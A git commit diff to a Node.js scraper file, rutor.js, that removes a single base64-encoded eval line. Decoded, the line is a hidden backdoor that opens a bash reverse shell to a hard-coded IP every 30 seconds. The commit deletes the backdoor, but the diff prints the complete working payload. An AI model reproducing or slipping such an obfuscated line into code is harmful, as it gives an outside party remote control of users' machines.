030ac4606b7fea43f6a7ad91f3d4572e9ea576df
Neev Alex <neevalex@gmail.com>
2026-05-14 16:38:11 +0300

    Update rutor.js

--- rutor.js
+++ rutor.js
@@ -3,7 +3,6 @@ const app     = express()
 
 var request   = require( 'request-promise' );
 const cheerio = require( 'cheerio' );
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 var html;
 
 var get_html = async function (i, res) {
